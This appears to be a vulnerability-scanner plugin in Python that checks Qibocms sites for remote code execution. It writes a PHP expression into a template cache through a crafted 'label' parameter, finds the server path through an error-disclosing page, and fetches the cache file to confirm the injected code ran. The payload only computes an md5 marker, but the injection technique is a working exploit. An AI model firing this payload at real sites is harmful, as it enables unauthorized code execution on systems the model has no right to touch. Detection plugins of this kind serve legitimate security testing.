#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#refer :http://www.wooyun.org/bugs/wooyun-2010-070366

def findPath(arg):
	import re
	pattern = re.compile(r'.+in[\s]*<b>([^<]*)</b>')
	url = arg + 'hack/gather/inc/show_system_fid.php'
	code, head, res, errcode,finalurl =  curl.curl(url)
	res = res.replace('\n', '')

	match = re.match(pattern, res)
	path = ''
	if match:
		path =  match.group(1)
		return path[:-36] + "/template/default/index.htm"
	return path

def getUrl(path):
	import hashlib
	h = hashlib.md5(path).hexdigest()[0:5]
	url = 'cache/label_cache/index_1_0_0_0_0_' + h + '.php'
	return url 

def assign(service, arg):
    if service == "qibocms":
        return True, arg

def audit(arg):
    payload  = "index.php?label[a%27.""${md5(%27testvul%27)}"".%27][testvul]=testvul%27"
    data = "c3e4d9dad03c818375d177debdba2126"

    curl.curl(arg + payload) #写入缓存文件
    path = findPath(arg)
    if path=='':
        return
    url = arg + getUrl(path)
    code, head, res, errcode,finalurl =  curl.curl(url)
    if res.find(data) != -1:
    	security_hole('Qibocms remote code execution:' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms', 'http://www.example.com/')[1])



